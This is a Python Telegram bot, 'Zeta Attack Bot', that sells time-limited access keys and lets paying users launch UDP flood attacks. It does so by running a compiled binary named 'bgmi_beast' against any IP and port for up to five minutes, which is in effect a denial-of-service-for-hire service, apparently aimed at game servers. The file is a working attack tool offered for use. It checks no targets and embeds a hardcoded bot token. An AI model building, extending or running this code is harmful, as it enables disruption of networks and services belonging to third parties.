#!/usr/bin/env python3
# Zo_bot.py - No Port Warnings

import os
import sys
import subprocess
import threading
import time
import json
import random
import string
from datetime import datetime, timedelta
from collections import defaultdict

from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# ============================================================
# CONFIGURATION
# ============================================================
BOT_TOKEN = "8402168828:AAHTB8REJZNq8cUvmEMcnaAgowk46uB8GkI"
ADMIN_ID = 6465928598

DATA_FILE = "zeta_users.json"
KEYS_FILE = "generated_keys.json"

# Binary path
BINARY_PATH = "./bgmi_beast"

# ============================================================
# DATA STRUCTURES
# ============================================================
active_attacks = {}
attack_lock = threading.Lock()

# ============================================================
# HELPER FUNCTIONS
# ============================================================
def load_json(filepath, default):
    if os.path.exists(filepath):
        with open(filepath, 'r') as f:
            return json.load(f)
    return default

def save_json(filepath, data):
    with open(filepath, 'w') as f:
        json.dump(data, f, indent=4)

def is_admin(user_id):
    return user_id == ADMIN_ID

def is_approved(user_id):
    data = load_json(DATA_FILE, {})
    user_data = data.get(str(user_id))
    if not user_data:
        return False
    expiry = datetime.fromisoformat(user_data.get('expiry', '2000-01-01'))
    return expiry > datetime.now()

def get_user_info(user_id):
    data = load_json(DATA_FILE, {})
    return data.get(str(user_id))

def generate_key(days):
    key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))
    expiry = (datetime.now() + timedelta(days=days)).isoformat()
    keys_data = load_json(KEYS_FILE, {})
    keys_data[key] = expiry
    save_json(KEYS_FILE, keys_data)
    return key

def redeem_key(user_id, key):
    keys_data = load_json(KEYS_FILE, {})
    if key not in keys_data:
        return False, "❌ Invalid key"
    expiry = datetime.fromisoformat(keys_data[key])
    if expiry < datetime.now():
        del keys_data[key]
        save_json(KEYS_FILE, keys_data)
        return False, "❌ Key expired"
    
    data = load_json(DATA_FILE, {})
    data[str(user_id)] = {'approved_by': 'key', 'expiry': expiry.isoformat(), 'redeemed_at': datetime.now().isoformat()}
    save_json(DATA_FILE, data)
    
    del keys_data[key]
    save_json(KEYS_FILE, keys_data)
    return True, f"✅ Access granted until {expiry.strftime('%Y-%m-%d %H:%M:%S')}"

def run_attack(chat_id, target_ip, port, duration, method="udp", threads=16):
    global active_attacks
    cmd = [BINARY_PATH, target_ip, str(port), str(duration), str(threads), method]
    
    try:
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        with attack_lock:
            active_attacks[chat_id] = {
                'target': f"{target_ip}:{port}",
                'end_time': datetime.now() + timedelta(seconds=duration),
                'process': process,
                'method': method,
                'threads': threads
            }
        
        process.wait()
        
        with attack_lock:
            if chat_id in active_attacks:
                del active_attacks[chat_id]
    except Exception as e:
        print(f"Attack error: {e}")

# ============================================================
# BOT COMMAND HANDLERS
# ============================================================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (
        "🔥 <b>Welcome to Zeta Attack Bot</b> 🔥\n\n"
        "⚡ This bot is powered by Zo, created by Alpha.\n"
        "👑 <b>Owner:</b> @Yowai_mo_456\n\n"
        "📖 <b>Commands:</b>\n"
        "/help - Show all commands\n"
        "/myinfo - Your access info\n"
        "/status - Active attacks\n"
        "/attack &lt;ip&gt; &lt;port&gt; &lt;duration&gt; - Launch attack\n\n"
        "⚠️ Use responsibly in Zeta realm only."
    )
    await update.message.reply_text(msg, parse_mode='HTML')

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_approved(user_id) and not is_admin(user_id):
        await update.message.reply_text("❌ You are not approved. Contact admin or use /redeem.")
        return
    
    msg = (
        "🔧 <b>Zeta Bot Commands</b> 🔧\n\n"
        "👤 <b>User Commands:</b>\n"
        "/attack &lt;ip&gt; &lt;port&gt; &lt;duration&gt; - Launch attack\n"
        "/myinfo - Show your access expiry\n"
        "/status - Show running attacks\n"
        "/redeem &lt;key&gt; - Redeem access key\n"
        "/help - This message\n\n"
        "👑 <b>Admin Commands:</b>\n"
        "/approve &lt;user_id&gt; &lt;days&gt; - Grant access\n"
        "/genkey &lt;days&gt; - Generate redeem key"
    )
    await update.message.reply_text(msg, parse_mode='HTML')

async def myinfo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    info = get_user_info(user_id)
    if not info:
        await update.message.reply_text("❌ No access found. Use /redeem or contact admin.")
        return
    
    expiry = datetime.fromisoformat(info['expiry'])
    remaining = expiry - datetime.now()
    days_left = remaining.days
    
    msg = f"📋 <b>Your Info</b>\n\n"
    msg += f"🆔 User ID: <code>{user_id}</code>\n"
    msg += f"📅 Expires: {expiry.strftime('%Y-%m-%d %H:%M:%S')}\n"
    msg += f"⏳ Days left: {days_left}\n"
    await update.message.reply_text(msg, parse_mode='HTML')

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_approved(user_id) and not is_admin(user_id):
        await update.message.reply_text("❌ Access denied.")
        return
    
    with attack_lock:
        if not active_attacks:
            await update.message.reply_text("✅ No active attacks running.")
            return
        
        msg = "🔥 <b>Active Attacks</b> 🔥\n\n"
        for chat_id, attack in active_attacks.items():
            remaining = (attack['end_time'] - datetime.now()).seconds
            msg += f"🎯 Target: <code>{attack['target']}</code>\n"
            msg += f"⏱️ Remaining: {remaining}s\n"
            msg += "────────────────\n"
        await update.message.reply_text(msg, parse_mode='HTML')

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    
    if not is_approved(user_id) and not is_admin(user_id):
        await update.message.reply_text("❌ You are not approved. Contact admin or use /redeem.")
        return
    
    args = context.args
    if len(args) < 3:
        await update.message.reply_text("⚠️ Usage: <code>/attack &lt;ip&gt; &lt;port&gt; &lt;duration&gt;</code>\nExample: <code>/attack 192.168.1.1 10001 60</code>", parse_mode='HTML')
        return
    
    target_ip = args[0]
    try:
        port = int(args[1])
        duration = int(args[2])
    except ValueError:
        await update.message.reply_text("❌ Port and duration must be numbers.")
        return
    
    if duration > 300:
        await update.message.reply_text("❌ Max duration is 300 seconds (5 minutes).")
        return
    
    # No port warnings - attack directly
    await update.message.reply_text(f"🔥 Launching attack on <code>{target_ip}:{port}</code> for {duration}s...", parse_mode='HTML')
    thread = threading.Thread(target=run_attack, args=(chat_id, target_ip, port, duration, "udp", 16))
    thread.daemon = True
    thread.start()

async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin only.")
        return
    
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Usage: <code>/approve &lt;user_id&gt; &lt;days&gt;</code>", parse_mode='HTML')
        return
    
    try:
        target_id = int(args[0])
        days = int(args[1])
    except ValueError:
        await update.message.reply_text("❌ Invalid user_id or days.")
        return
    
    expiry = datetime.now() + timedelta(days=days)
    data = load_json(DATA_FILE, {})
    data[str(target_id)] = {'approved_by': 'admin', 'expiry': expiry.isoformat()}
    save_json(DATA_FILE, data)
    
    await update.message.reply_text(f"✅ User <code>{target_id}</code> approved for {days} days.", parse_mode='HTML')

async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin only.")
        return
    
    args = context.args
    if len(args) < 1:
        await update.message.reply_text("Usage: <code>/genkey &lt;days&gt;</code>", parse_mode='HTML')
        return
    
    try:
        days = int(args[0])
    except ValueError:
        await update.message.reply_text("❌ Invalid days.")
        return
    
    key = generate_key(days)
    await update.message.reply_text(f"🔑 <b>Generated Key</b>\n\n<code>{key}</code>\n\nValid for {days} days.", parse_mode='HTML')

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    args = context.args
    
    if len(args) < 1:
        await update.message.reply_text("Usage: <code>/redeem &lt;key&gt;</code>", parse_mode='HTML')
        return
    
    key = args[0]
    success, msg = redeem_key(user_id, key)
    await update.message.reply_text(msg, parse_mode='HTML')

# ============================================================
# MAIN
# ============================================================
def main():
    print("🔥 Zo Bot is running...")
    print(f"👑 Admin ID: {ADMIN_ID}")
    
    if not os.path.exists(BINARY_PATH):
        print(f"⚠️ Binary not found at {BINARY_PATH}")
        print("Compile: clang++ -O3 -pthread -o bgmi_beast bgmi.c")
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("myinfo", myinfo))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(CommandHandler("redeem", redeem))
    app.add_handler(CommandHandler("approve", approve))
    app.add_handler(CommandHandler("genkey", genkey))
    
    app.run_polling()

if __name__ == "__main__":
    main()